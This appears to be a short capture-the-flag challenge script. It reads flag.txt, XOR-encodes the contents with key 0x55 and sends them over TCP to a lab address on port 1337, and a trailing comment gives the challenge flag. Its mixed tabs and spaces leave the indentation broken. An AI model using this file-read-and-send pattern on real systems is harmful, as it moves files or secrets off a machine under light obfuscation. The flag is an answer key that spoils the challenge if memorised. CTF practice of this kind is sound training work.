import socket

# Function to encrypt data with XOR
def encrypt(data, key):
    encrypted_data = bytearray()
    for byte in data:
    	    encrypted_data.append(byte ^ key)
    return encrypted_data

# Read flag from file
with open('flag.txt', 'rb') as file:
	flag_content = file.read()

	# Encrypt flag content
	encrypted_flag = encrypt(flag_content, 0x55)

    # TCP settings
    HOST = '10.0.0.36'  # Change this to your server IP
    PORT = 1337        # Change this to your desired port

    # Create socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to server
    s.connect((HOST, PORT))

    # Send encrypted flag
	s.sendall(encrypted_flag)

# Close the connection
s.close()
###FLAG FOR BURGLAR: HZU{W0w_suCh-4_GENIE}